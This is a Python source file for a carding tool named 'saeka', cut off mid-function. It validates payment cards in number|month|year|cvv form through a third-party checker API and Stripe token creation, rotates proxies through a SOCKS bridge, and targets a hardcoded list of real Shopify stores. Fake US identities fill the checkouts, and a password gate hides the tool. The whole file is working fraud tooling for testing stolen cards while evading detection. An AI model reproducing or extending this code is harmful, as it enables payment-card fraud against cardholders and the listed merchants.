#!/usr/bin/env python3
# saeka v12.0 — cc checker · shopify browser checkout · stripe · proxy · linux theme
# deps: requests, colorama, packaging, pysocks, playwright (optional)

import os, re, sys, json, time, base64, hashlib, getpass, random, socket, shutil
import threading, itertools, subprocess, socketserver, contextlib, asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, urljoin
from collections import defaultdict

APP_VERSION = "15.0"
GITHUB_REPO = "qkc404/itzpy"
GITHUB_API = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"

# =========================================================
#  BOOTSTRAP
# =========================================================
_REQUIRED = [("requests", "requests"), ("colorama", "colorama"),
             ("packaging", "packaging"), ("socks", "pysocks")]

def _bootstrap():
    missing = []
    for mod, pkg in _REQUIRED:
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[boot] installing: {', '.join(missing)}")
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", *missing],
                       check=False)

try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

_bootstrap()

import requests
from colorama import Fore, Style, init
from packaging.version import Version, InvalidVersion
init(autoreset=True)

# =========================================================
#  THEME
# =========================================================
G0 = Fore.GREEN + Style.BRIGHT
G1 = Fore.LIGHTGREEN_EX
G2 = Fore.GREEN + Style.DIM
CY = Fore.LIGHTCYAN_EX + Style.BRIGHT
WH = Fore.LIGHTWHITE_EX
RD = Fore.LIGHTRED_EX + Style.BRIGHT
YL = Fore.LIGHTYELLOW_EX + Style.BRIGHT
MG = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
DM = Style.DIM
RS = Style.RESET_ALL

# =========================================================
#  PATHS
# =========================================================
HOME = os.path.expanduser("~")
CONFIG_DIR = os.path.join(HOME, ".saeka")
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
STORE_CACHE = os.path.join(CONFIG_DIR, "shopify_stores.json")
os.makedirs(CONFIG_DIR, exist_ok=True)

CC_API = "https://uncoder.eu.org/cc-checker/api.php"
CC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://uncoder.eu.org",
    "Referer": "https://uncoder.eu.org/cc-checker/",
    "X-Requested-With": "XMLHttpRequest",
}
BIN_API = "https://lookup.binlist.net/"
BIN_HEADERS = {"Accept-Version": "3", "User-Agent": "Mozilla/5.0 (Linux; Android 15)"}

CC_RE = re.compile(r"^\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

# =========================================================
#  SHOPIFY DOMAINS (restored from v10.x)
# =========================================================
SHOPIFY_DOMAINS = """
gymshark.com, allbirds.com, fashionnova.com, kyliecosmetics.com, tatcha.com,
glossier.com, fentybeauty.com, drunkelephant.com, supergoop.com, youthtothepeople.com,
paulaschoice.com, thenimetyou.com, bombas.com, rothys.com, thirdlove.com,
frankiesbikinis.com, cutsclothing.com, mackweldon.com, vuori.com, outdoorvoices.com,
trueclassictees.com, chubbiesshorts.com, buckmason.com, oatly.com, huel.com,
vervecoffee.com, blkandbold.com, flybyjing.com, tazachocolate.com, goodfair.com,
bigblanket.com, goodeeworld.com, packagefreeshop.com, pelacase.com, loopearplugs.com,
chillys.com, bruvi.com, silkandwillow.com, lunchskins.com, ozonesocks.com,
analuisa.com, danielwellington.com, mvmt.com, vincero.com, bremont.com,
troubadourgoods.com, cocofloss.com, givemetap.com, leotardboutique.com, velasca.com,
anker.com, nomadgoods.com, peakdesign.com, shopmoment.com, bellroy.com,
waterfield.com, satechi.net, nativeunion.com, lovevery.com, lowlandkids.com,
lootcrate.com, potgang.co.uk, patagonia.com, whoop.com, ridge.com, ouraring.com,
skims.com, warbyparker.com, yellowbird.com, zitsticka.com, ritual.com, seed.com,
sakara.com, tiege.com, vessi.com, wellbel.com, purelyelizabeth.com, drbronner.com,
eight-sleep.com, mudwtr.com, carawayhome.com, brooklinen.com, parachutehome.com,
ruggable.com, snowehome.com, ring.com, 100thieves.com, shopmrbeast.com,
threadless.com, redbull.com, hismile.com, mycarpe.com, juniperandivy.com,
hellotushy.com, cocokind.com, kinship.com, ursamajorvt.com, truebotanicals.com,
biossance.com, herbivorebotanicals.com, mejuri.com, missoma.com, au-rate.com,
catbirdnyc.com, gorjana.com, jenny-bird.com, starlingjewelry.com, alphalete.com,
youngla.com, raskol.com, frasershirts.com, rhone.com, mizzenandmain.com,
ministryofsupply.com, kidbox.com, primary.com, hannaandersson.com, miniware.com,
biomel.com, care-of.com, thorne.com, ag1.com, lmnt.com, drinklmnt.com,
waterboy.com, curehydration.com, tenthousand.cc, nobullproject.com,
vivobarefoot.com, merrell.com, hoka.com, fleetfeet.com, roadrunnersports.com,
jackrabbit.com, runningwarehouse.com, holabirdsports.com, thehoneypot.co,
beautybakerie.com, cheekbonebeauty.com, lastobject.com, econea.com, flourist.com,
hiutdenim.co.uk, bodybuilding.com, rayconglobal.com, puravidabracelets.com,
wyzecam.com, condorcycles.com, pipsnacks.com, stevemadden.com, on.com,
ecoflow.com, voomisupply.com, goodbuygear.com, humehealth.com, wearfigs.com,
jackery.com, cupshe.com, dreametech.com, ugreen.com, carparts.com, aloyoga.com,
eufy.com, velotricbike.com, jenis.com, xtool.com, nrsworld.com, thornebros.com,
shokz.com, tartecosmetics.com, speediance.com, ooni.com, bagsmart.com,
nobltravel.com, orthofeet.com, segway.com, ryzesuperfoods.com, tymobeauty.com,
gaia.com, thewoobles.com, stanley1913.com, vicegolf.com, sheffield-pottery.com,
uspoloassn.com, lasfit.com, rallysportdirect.com, babylist.com, eyekeeper.com,
onepeloton.com, thehalara.com, x-sense.com, proudpatriots.com, kickcrew.com,
ourlandoutdoor.com, jovs.com, altfragrances.com, rugsusa.com, bonescoffee.com,
jackboxgames.com, firefold.com, lovetodream.com, novaalab.com, hulalahome.com,
goodevas.com, patriotdepot.com, tmgindustrial.com, trybello.com,
seattlecoffeegear.com, spotlightoralcare.com, frejanyc.com, cosmotogether.com,
montessorigeneration.com, poshpeanut.com, eriksbikeshop.com, langehair.com,
solacebands.com, vaerwatches.com, sundays-company.com, pura.com, auxbeam.com,
design-edc.com, edusensetoys.com, autos-suggestions.ca, dirniashop.com,
cloudhamptonvape.com, blbijou.com, elkhartrvparts.com, apexpack.co.nz, afilm.me,
densifil.com, apollomvmt.com, minbie.co.uk, valmeris.com, dfyne.com, saffnco.com,
mokinglobal.com, unifydrive.com, ketodirect.com.au, iamgia.com, primalpastures.com,
cirklestreet.com, charmingintimates.com, konainfashion.com, glowzii.com,
clickenshop.com, mynumy.com, vidawheel.com, soneesports.com, appliancespares.com.au,
zillymonkey.com, gatheringgames.co.uk, eternacards.co.uk, rungoodlife.com,
joshscards.com, gbtoys.com.au, store.sho.com, deathwishcoffee.com, resilia.shop,
smooche.com, helloklean.com, blenderseyewear.com, cozyearth.com, schutz-shoes.com,
dubgum.com, 1md.org, 308industries.com, 310mood.com, 360spb.com, 361europe.com,
3dogpetsupply.com, 3pawspetproducts.com, 3rdbirdcollective.com, 42birds.com,
42lolita.com, 4boats.co.uk, 911wallet.com, 945industries.com, a-esque.com,
a-martinez.com, a-maz.com, a1decoy.co.uk, a1swag.com, a2z4kids.co.uk,
a7xworld.com, aaappliancecenter.com, aabn.io, aaminisplits.com, aapistons.com,
abyss-headphones.com, acaciasf.com, academiabutic.com, academyfits.com,
acasom.com, accesspossibilities.com, accura.ie, accurafil.com, acefixings.com,
acevacuums.com
"""
SHOPIFY_DOMAINS = [d.strip() for d in SHOPIFY_DOMAINS.replace("\n", " ").split(",")
                   if d.strip()]

# =========================================================
#  TERMINAL PRIMITIVES
# =========================================================
def clear():
    sys.stdout.write("\x1b[2J\x1b[H")
    sys.stdout.flush()

def hide_cursor():
    sys.stdout.write("\x1b[?25l"); sys.stdout.flush()

def show_cursor():
    sys.stdout.write("\x1b[?25h"); sys.stdout.flush()

def term_w():
    try:
        w = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        w = 80
    return max(40, w)

def box_w():
    return min(max(48, term_w() - 4), 78)

def _vlen(s):
    return len(ANSI_RE.sub("", s))

def center(text, width=None, color=""):
    w = width or term_w()
    vis = _vlen(text)
    pad = max(0, (w - vis) // 2)
    return " " * pad + color + text + RS

class Box:
    def __init__(self, title="", width=None, color=G0):
        self.title = title
        self.width = width or box_w()
        self.color = color
        self.lines = []
    def add(self, line):
        self.lines.append(line); return self
    def render(self):
        w = self.width
        inner = w - 2
        print(self.color + "┌" + ("─" * inner) + "┐" + RS)
        if self.title:
            t = " " + self.title + " "
            tv = _vlen(t)
            left = max(0, (inner - tv) // 2)
            right = max(0, inner - left - tv)
            print(self.color + "│" + RS + " " * left + WH + t + RS
                  + " " * right + self.color + "│" + RS)
            print(self.color + "├" + ("─" * inner) + "┤" + RS)
        for ln in self.lines:
            vis = _vlen(ln)
            pad = max(0, inner - 1 - vis)
            print(self.color + "│" + RS + " " + ln + (" " * pad) + self.color + "│" + RS)
        print(self.color + "└" + ("─" * inner) + "┘" + RS)

# =========================================================
#  SPINNER
# =========================================================
class Spinner:
    FRAMES = ["◜", "◝", "◞", "◟"]
    def __init__(self, label="working", centered=False, color=CY):
        self.label = label; self.centered = centered; self.color = color
        self._stop = threading.Event(); self._t = None
    def _spin(self):
        i = 0
        while not self._stop.is_set():
            f = self.FRAMES[i % len(self.FRAMES)]
            txt = f"{self.color}{f}{RS}  {WH}{self.label}{RS}"
            if self.centered:
                sys.stdout.write("\r" + " " * term_w() + "\r" + center(txt))
            else:
                sys.stdout.write("\r  " + txt + "  ")
            sys.stdout.flush()
            time.sleep(0.1); i += 1
    def __enter__(self):
        hide_cursor()
        self._t = threading.Thread(target=self._spin, daemon=True)
        self._t.start(); return self
    def __exit__(self, *a):
        self._stop.set()
        if self._t: self._t.join()
        sys.stdout.write("\r" + " " * term_w() + "\r")
        sys.stdout.flush()
        show_cursor()

class StartupSpinner:
    def __init__(self):
        self._stop = threading.Event(); self._t = None
        self.status = "initializing"
    def set_status(self, s): self.status = s
    def _spin(self):
        i = 0
        while not self._stop.is_set():
            f = Spinner.FRAMES[i % len(Spinner.FRAMES)]
            sys.stdout.write("\r" + " " * term_w() + "\r" + center(f"{G0}{f}{RS}") + "\n")
            sys.stdout.write("\r" + " " * term_w() + "\r" + center(f"{DM}{self.status}{RS}"))
            sys.stdout.write("\x1b[1A")
            sys.stdout.flush()
            time.sleep(0.09); i += 1
    def start(self):
        hide_cursor()
        sys.stdout.write("\n\n")
        self._t = threading.Thread(target=self._spin, daemon=True)
        self._t.start()
    def stop(self):
        self._stop.set()
        if self._t: self._t.join()
        sys.stdout.write("\x1b[1B\r" + " " * term_w() + "\r\n\r\n")
        sys.stdout.flush()
        show_cursor()

# =========================================================
#  AUTH
# =========================================================
_PW_B64 = ["c2Fla2E=", "c2Fla2FjdXRpZQ==", "Y2hr", "c2Fla2FjaGVja2Vy"]
def _hash(s): return hashlib.sha256(s.encode("utf-8")).hexdigest()
_VALID_HASHES = {_hash(base64.b64decode(b).decode("utf-8")) for b in _PW_B64}

def auth_gate():
    clear()
    print(); print()
    print(center(G0 + "SAEKA" + RS))
    print(center(DM + "v" + APP_VERSION + RS))
    print()
    print(center(G2 + ("─" * 44) + RS))
    print(center(G0 + "authentication" + RS))
    print(center(G2 + ("─" * 44) + RS))
    print()
    for attempt in range(1, 4):
        try:
            prompt = "  " + CY + "▶ " + WH + "password " + DM + f"[{attempt}/3]" + RS + "  "
            pw = getpass.getpass(prompt)
        except Exception:
            pw = input("  password: ")
        if _hash(pw) in _VALID_HASHES:
            print()
            with Spinner("verifying session", centered=True):
                time.sleep(0.5)
            print(center(G0 + "✓ access granted" + RS))
            time.sleep(0.5)
            return True
        print(center(RD + f"✗ wrong password ({attempt}/3)" + RS))
        time.sleep(0.4)
    print()
    print(center(RD + "too many attempts" + RS))
    time.sleep(1.2)
    return False

# =========================================================
#  CONFIG
# =========================================================
_US_ADDR = {
    "cities": [
        ("New York", "NY", "10001", "212"), ("Los Angeles", "CA", "90001", "213"),
        ("Chicago", "IL", "60601", "312"), ("Houston", "TX", "77001", "713"),
        ("Phoenix", "AZ", "85001", "602"), ("Philadelphia", "PA", "19101", "215"),
        ("San Antonio", "TX", "78201", "210"), ("San Diego", "CA", "92101", "619"),
        ("Dallas", "TX", "75201", "214"), ("Austin", "TX", "78701", "512"),
        ("Seattle", "WA", "98101", "206"), ("Denver", "CO", "80201", "303"),
        ("Boston", "MA", "02101", "617"), ("Miami", "FL", "33101", "305"),
    ],
    "streets": ["Main St", "Oak Ave", "Maple Dr", "Pine St", "Elm St",
                "Washington Ave", "Park Blvd", "Cedar Ln", "Sunset Dr",
                "Riverside Dr", "Highland Ave", "Spring St", "Broadway"],
    "first_names": ["James", "John", "Robert", "Michael", "William", "David",
                    "Richard", "Joseph", "Mary", "Patricia", "Jennifer", "Linda",
                    "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Emily",
                    "Daniel", "Matthew"],
    "last_names": ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                   "Miller", "Davis", "Rodriguez", "Martinez", "Wilson",
                   "Anderson", "Taylor", "Moore", "Jackson", "Martin",
                   "Lee", "Perez", "Thompson", "White"],
}

def generate_address():
    city, state, base_zip, area = random.choice(_US_ADDR["cities"])
    street_num = random.randint(100, 9999)
    street = random.choice(_US_ADDR["streets"])
    zip_code = base_zip[:-2] + f"{random.randint(0, 99):02d}"
    first = random.choice(_US_ADDR["first_names"])
    last = random.choice(_US_ADDR["last_names"])
    phone = f"+1{area}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 999)}@" \
            f"{random.choice(['gmail.com','yahoo.com','outlook.com','icloud.com'])}"
    return {"first_name": first, "last_name": last,
            "address1": f"{street_num} {street}",
            "address2": random.choice(["", "", "", "Apt " + str(random.randint(1, 999))]),
            "city": city, "province_code": state, "country_code": "US",
            "zip": zip_code, "phone": phone, "email": email}

DEFAULT_CONFIG = {
    "storage_folder": HOME,
    "proxies": [],
    "address": generate_address(),
    "headless": True,
    "timeout_ms": 45000,
    "stripe_pk": "",
}

def load_config():
    if not os.path.isfile(CONFIG_PATH):
        save_config(DEFAULT_CONFIG); return dict(DEFAULT_CONFIG)
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        for k, v in DEFAULT_CONFIG.items():
            cfg.setdefault(k, v)
        addr = cfg.setdefault("address", {})
        for k, v in generate_address().items():
            addr.setdefault(k, v)
        return cfg
    except Exception:
        return dict(DEFAULT_CONFIG)

def save_config(cfg):
    try:
        with open(CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(RD + f"  config save failed: {e}" + RS)

CFG = load_config()

def ensure_storage():
    folder = CFG.get("storage_folder") or HOME
    if not os.path.isdir(folder):
        try:
            os.makedirs(folder, exist_ok=True)
        except Exception:
            folder = HOME
            CFG["storage_folder"] = folder
            save_config(CFG)
    return folder

# =========================================================
#  FILE PICKER
# =========================================================
def _resolve_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw:
        return None
    if raw.startswith("~"):
        return os.path.expanduser(raw)
    for prefix in ("storage/emulated/0/", "/storage/emulated/0/"):
        if raw.startswith(prefix):
            return os.path.expanduser("~/storage/shared/" + raw[len(prefix):])
    if os.path.isabs(raw):
        return raw
    return os.path.abspath(raw)

def _default_start_dir():
    for c in [os.path.expanduser("~/storage/shared"),
              os.path.expanduser("~/storage/downloads"),
              os.path.expanduser("~/storage"),
              os.path.expanduser("~"),
              os.getcwd()]:
        if os.path.isdir(c):
            return c
    return os.getcwd()

def pick_path(ext=None, start_dir=None, want_dir=False, title="file picker"):
    cur = start_dir or _default_start_dir()
    while True:
        clear()
        w = box_w()
        b = Box(title=title, width=w)
        dir_disp = cur
        if len(dir_disp) > w - 8:
            dir_disp = "…" + dir_disp[-(w - 9):]
        b.add(f"  {DM}dir{RS}  {CY}{dir_disp}{RS}")
        b.add(f"  {DM}{'─' * (w - 6)}{RS}")

        entries = []
        parent = os.path.dirname(cur)
        if parent and parent != cur:
            entries.append(("..", parent, "up"))
        try:
            names = sorted(os.listdir(cur))
        except Exception:
            names = []
        for n in names:
            if n.startswith("."):
                continue
            p = os.path.join(cur, n)
            try:
                if os.path.isdir(p):
                    entries.append((n + "/", p, "dir"))
                elif ext is None or n.lower().endswith(ext.lower()):
                    entries.append((n, p, "file"))
            except Exception:
                continue

        if not entries:
            b.add(f"  {DM}(empty){RS}")
        else:
            max_show = 20
            for i, (name, path, kind) in enumerate(entries[:max_show], 1):
                disp = name
                max_name = w - 14
                if len(disp) > max_name:
                    disp = disp[:max_name - 1] + "…"
                if kind in ("dir", "up"):
                    b.add(f"  {WH}[{i:>3}]{RS}  {CY}{disp}{RS}")
                else:
                    b.add(f"  {WH}[{i:>3}]{RS}  {G1}{disp}{RS}")
            if len(entries) > max_show:
                b.add(f"  {DM}... +{len(entries) - max_show} more{RS}")

        b.add(f"  {DM}{'─' * (w - 6)}{RS}")
        hint = "q = cancel"
        if want_dir:
            hint = "enter = select this folder  ·  " + hint
        b.add(f"  {DM}{hint}{RS}")
        b.render()
        print()
        try:
            c = input(f"  {CY}▶ {WH}").strip()
        except KeyboardInterrupt:
            return None
        if c.lower() == "q":
            return None
        if c == "" and want_dir:
            return cur
        if c == ".." and entries and entries[0][2] == "up":
            cur = entries[0][1]
            continue
        try:
            i = int(c) - 1
            if 0 <= i < len(entries):
                _, path, kind = entries[i]
                if kind in ("dir", "up"):
                    cur = path
                else:
                    return path
        except ValueError:
            pass

def choose_file(ext=".txt", title="select file", start_dir=None):
    clear()
    w = box_w()
    b = Box(title=title, width=w)
    b.add(f"  {WH}[1]{RS}  browse files")
    b.add(f"  {WH}[2]{RS}  type path manually")
    b.add(f"  {WH}[0]{RS}  cancel")
    b.render()
    print()
    c = input(f"  {CY}▶ {WH}").strip()
    if c == "0" or c == "":
        return None
    if c == "2":
        raw = input(f"  {CY}▶ {WH}path{RS}  ")
        p = _resolve_path(raw)
        if p and not os.path.isfile(p) and not os.path.splitext(p)[1]:
            cand = p + ext
            if os.path.isfile(cand):
                p = cand
        if not p or not os.path.isfile(p):
            print("  " + RD + f"✗ not found: {p or raw}" + RS)
            time.sleep(1.2)
            return None
        return p
    return pick_path(ext=ext, start_dir=start_dir, title=title)

def choose_dir(title="select folder", start_dir=None):
    clear()
    w = box_w()
    b = Box(title=title, width=w)
    b.add(f"  {WH}[1]{RS}  browse folders")
    b.add(f"  {WH}[2]{RS}  type path manually")
    b.add(f"  {WH}[0]{RS}  cancel")
    b.render()
    print()
    c = input(f"  {CY}▶ {WH}").strip()
    if c == "0" or c == "":
        return None
    if c == "2":
        raw = input(f"  {CY}▶ {WH}path{RS}  ")
        p = _resolve_path(raw)
        if not p:
            return None
        try:
            os.makedirs(p, exist_ok=True)
        except Exception as e:
            print("  " + RD + str(e) + RS)
            time.sleep(1.2)
            return None
        return p
    return pick_path(start_dir=start_dir, want_dir=True, title=title)

# =========================================================
#  PROXY POOL
# =========================================================
class ProxyMetrics:
    def __init__(self):
        self._lock = threading.Lock()
        self.success = defaultdict(int)
        self.fail = defaultdict(int)
        self.timeout = defaultdict(int)
        self.dead_until = {}
    def record_success(self, p):
        with self._lock:
            self.success[p] += 1
            self.dead_until.pop(p, None)
    def record_fail(self, p, kind="fail"):
        with self._lock:
            if kind == "timeout":
                self.timeout[p] += 1
            else:
                self.fail[p] += 1
    def mark_dead(self, p, cooldown=60):
        with self._lock:
            self.dead_until[p] = time.time() + cooldown
    def is_alive(self, p):
        with self._lock:
            return self.dead_until.get(p, 0) <= time.time()
    def get_stats(self, p):
        with self._lock:
            s = self.success.get(p, 0)
            f = self.fail.get(p, 0)
            t = self.timeout.get(p, 0)
            total = s + f + t
            rate = (s / total * 100) if total else 0
            return {"success": s, "fail": f, "timeout": t,
                    "total": total, "success_rate": rate}

def normalize_proxy(p):
    p = p.strip()
    if not p:
        return None
    if "://" not in p:
        p = "http://" + p
    try:
        u = urlparse(p)
        sch = (u.scheme or "http").lower()
        if sch not in ("http", "https", "socks4", "socks4a", "socks5", "socks5h"):
            return None
        if not u.hostname:
            return None
        port = u.port or (1080 if "socks" in sch else 80)
        if not (1 <= port <= 65535):
            return None
        if u.username and u.password:
            return f"{sch}://{u.username}:{u.password}@{u.hostname}:{port}"
        return f"{sch}://{u.hostname}:{port}"
    except Exception:
        return None

def proxy_dict(p):
    return {"http": p, "https": p} if p else None

def test_tcp(proxy_str, timeout=8):
    try:
        u = urlparse(proxy_str)
        host = u.hostname
        port = u.port or (1080 if "socks" in u.scheme else 80)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True, None
    except socket.timeout:
        return False, "timeout"
    except ConnectionRefusedError:
        return False, "refused"
    except Exception as e:
        return False, str(e)[:40]

class ProxyPool:
    def __init__(self, proxies, metrics=None):
        self.proxies = [p for p in proxies if p]
        self.metrics = metrics or ProxyMetrics()
        self._lock = threading.Lock()
        self._idx = 0
    def __bool__(self):
        return len(self.proxies) > 0
    def __len__(self):
        return len(self.proxies)
    def next(self):
        if not self.proxies:
            return None
        with self._lock:
            for _ in range(len(self.proxies) * 2):
                p = self.proxies[self._idx % len(self.proxies)]
                self._idx += 1
                if self.metrics.is_alive(p):
                    return p
            self._idx = 0
            return self.proxies[0]
    def mark_success(self, p):
        if p in self.proxies:
            self.metrics.record_success(p)
    def mark_dead(self, p, kind="fail", cooldown=60):
        if p in self.proxies:
            self.metrics.record_fail(p, kind)
            self.metrics.mark_dead(p, cooldown)
    def health(self):
        if not self.proxies:
            return 0
        return sum(1 for p in self.proxies if self.metrics.is_alive(p)) / len(self.proxies) * 100

def build_pool():
    raw = CFG.get("proxies", [])
    norm = [n for n in (normalize_proxy(p) for p in raw) if n]
    return ProxyPool(norm) if norm else None

# =========================================================
#  SOCKS -> HTTP BRIDGE
# =========================================================
_bridges = []
_bridge_lock = threading.Lock()

def _start_socks_bridge(socks_url):
    import socks
    u = urlparse(socks_url)
    socks_host = u.hostname
    socks_port = u.port or 1080
    socks_user = u.username or None
    socks_pass = u.password or None

    class _Handler(socketserver.BaseRequestHandler):
        def handle(self):
            try:
                self.request.settimeout(30)
                raw = b""
                while b"\r\n\r\n" not in raw:
                    chunk = self.request.recv(4096)
                    if not chunk:
                        return
                    raw += chunk
                line = raw.split(b"\r\n", 1)[0].decode(errors="ignore")
                if not line.upper().startswith("CONNECT"):
                    self.request.sendall(b"HTTP/1.1 405 Method Not Allowed\r\n\r\n")
                    return
                target = line.split()[1]
                host, _, port_s = target.partition(":")
                port = int(port_s) if port_s else 443
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, socks_host, socks_port,
                            username=socks_user, password=socks_pass)
                s.settimeout(30)
                s.connect((host, port))
                self.request.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
                self._pipe(self.request, s)
            except Exception:
                with contextlib.suppress(Exception):
                    self.request.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
        def _pipe(self, a, b):
            a.settimeout(None); b.settimeout(None)
            def fwd(src, dst):
                try:
                    while True:
                        data = src.recv(16384)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception:
                    pass
                finally:
                    with contextlib.suppress(Exception):
                        dst.shutdown(socket.SHUT_WR)
            t1 = threading.Thread(target=fwd, args=(a, b), daemon=True)
            t2 = threading.Thread(target=fwd, args=(b, a), daemon=True)
            t1.start(); t2.start(); t1.join(); t2.join()

    server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), _Handler)
    server.daemon_threads = True
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    with _bridge_lock:
        _bridges.append(server)
    return f"http://127.0.0.1:{port}"

def resolve_browser_proxy(proxy_str):
    """If proxy is socks, spin a local bridge. Otherwise return as-is."""
    if not proxy_str:
        return None
    sch = proxy_str.lower().split("://", 1)[0] if "://" in proxy_str else ""
    if sch in ("socks", "socks4", "socks4a", "socks5", "socks5h"):
        try:
            return _start_socks_bridge(proxy_str)
        except Exception:
            return None
    return proxy_str

# =========================================================
#  CC CHECKING
# =========================================================
def _api_req(cc, proxy):
    try:
        r = requests.post(CC_API, data={"data": cc}, headers=CC_HEADERS,
                          timeout=15, proxies=proxy_dict(proxy))
        if r.status_code != 200:
            return {"status": "error", "message": f"HTTP {r.status_code}"}, r.status_code in (429, 503)
        try:
            body = r.json()
        except Exception:
            return {"status": "error", "message": "invalid json"}, False
        if not isinstance(body, dict):
            return {"status": "error", "message": "bad response"}, False
        raw = str(body.get("status", "")).lower().strip()
        mapping = {"live": "live", "valid": "live", "approved": "live",
                   "dead": "dead", "invalid": "dead", "declined": "dead",
                   "charged": "charged", "error": "error"}
        result = {"status": mapping.get(raw, "unknown"),
                  "message": str(body.get("message", "")).strip(),
                  "raw_status": raw}
        for k in ("network", "card", "color", "msg"):
            if body.get(k):
                result[k] = str(body[k])
        return result, False
    except requests.Timeout:
        return {"status": "error", "message": "timeout"}, True
    except (requests.ProxyError, requests.ConnectionError) as e:
        return {"status": "error", "message": str(e)[:60]}, True
    except Exception as e:
        return {"status": "error", "message": str(e)[:80]}, False

def api_check(cc, pool=None, retries=2):
    last = {"status": "error", "message": "no attempt"}
    for i in range(retries + 1):
        proxy = pool.next() if pool else None
        res, is_dead = _api_req(cc, proxy)
        last = res
        if is_dead and pool and proxy:
            pool.mark_dead(proxy)
        elif pool and proxy and res.get("status") != "error":
            pool.mark_success(proxy)
        if res.get("status") != "error":
            return res
        if i < retries:
            time.sleep(1.2 * (i + 1))
    return last

_BIN_CACHE = {}
_BIN_LOCK = threading.Lock()

def flag_emoji(a2):
    if not a2 or len(a2) != 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c.upper()) - ord("A")) for c in a2)

def lookup_bin(bin_number, pool=None):
    with _BIN_LOCK:
        if bin_number in _BIN_CACHE:
            return _BIN_CACHE[bin_number]
    result = {}
    proxy = pool.next() if pool else None
    try:
        r = requests.get(BIN_API + bin_number, headers=BIN_HEADERS, timeout=10,
                         proxies=proxy_dict(proxy))
        if r.status_code == 200:
            d = r.json() or {}
            c = d.get("country") or {}
            b = d.get("bank") or {}
            a2 = (c.get("alpha2") or "").upper()
            result = {"scheme": (d.get("scheme") or "").capitalize(),
                      "type": (d.get("type") or "").capitalize(),
                      "prepaid": bool(d.get("prepaid")),
                      "bank": b.get("name") or "",
                      "country": c.get("name") or "",
                      "country_code": a2,
                      "country_emoji": c.get("emoji") or flag_emoji(a2)}
        elif r.status_code == 429:
            result = {"error": "rate-limited"}
        elif r.status_code == 404:
            result = {"error": "bin-not-found"}
        else:
            result = {"error": f"http-{r.status_code}"}
    except Exception as e:
        result = {"error": str(e)[:60]}
    with _BIN_LOCK:
        _BIN_CACHE[bin_number] = result
    return result

def extract_bin(cc):
    return cc.split("|")[0][:6]

# =========================================================
#  STRIPE
# =========================================================
def stripe_check(cc, pool=None):
    pk = CFG.get("stripe_pk")
    if not pk:
        return {"status": "error", "message": "no stripe key"}
    parts = cc.split("|")
    if len(parts) != 4:
        return {"status": "error", "message": "bad format"}
    num, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    url = "https://api.stripe.com/v1/tokens"
    data = {"card[number]": num, "card[exp_month]": mm,
            "card[exp_year]": yy, "card[cvc]": cvv}
    headers = {"Authorization": f"Bearer {pk}",
               "Content-Type": "application/x-www-form-urlencoded"}
    proxy = pool.next() if pool else None
    try:
        r = requests.post(url, data=data, headers=headers, timeout=15,
                          proxies=proxy_dict(proxy))
        if r.status_code == 200:
            j = r.json()
            if j.get("id"):
                return {"status": "approved", "message": "token created"}
        try:
            err = r.json().get("error", {})
            code = err.get("code", "")
            msg = err.get("message", "")
        except Exception:
            code, msg = "", r.text[:100]
        low = (code + " " + msg).lower()
        if any(k in low for k in ("incorrect_number", "invalid_number", "card_declined",
                                   "expired_card", "incorrect_cvc", "insufficient_funds")):
            return {"status": "declined", "message": msg or code}
        return {"status": "unknown", "message": msg or f"HTTP {r.status_code}"}
    except Exception as e:
        return {"status": "error", "message": str(e)[:80]}

# =========================================================
#  SHOPIFY VARIANT FETCH (layered)
# =========================================================
_VARIANT_CACHE = {}
_VARIANT_LOCK = threading.Lock()

def _extract_handles(html):
    return list(set(re.findall(r'/products/([a-zA-Z0-9_\-]+)', html)))

def fetch_variant(domain, pool=None):
    with _VARIANT_LOCK:
        if domain in _VARIANT_CACHE:
            return _VARIANT_CACHE[domain]

    proxy = pool.next() if pool else None
    px = proxy_dict(proxy)
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}

    def _get(url):
        try:
            return requests.get(url, headers=ua, timeout=15, proxies=px)
        except Exception:
            return None

    handles = []

    # 1. sitemap
    for sm in ("/sitemap_products_1.xml", "/sitemap_products_2.xml", "/sitemap.xml"):
        r = _get(f"https://{domain}{sm}")
        if not r or r.status_code != 200:
            continue
        if "<sitemap>" in r.text:
            m = re.search(r"<loc>([^<]*sitemap_products[^<]*)</loc>", r.text)
            if m:
                r = _get(m.group(1))
                if not r:
                    continue
        urls = re.findall(r"<loc>(https://[^<]+/products/[^<]+)</loc>", r.text)
        for u in urls:
            h = u.rstrip("/").split("/products/")[-1].split("?")[0]
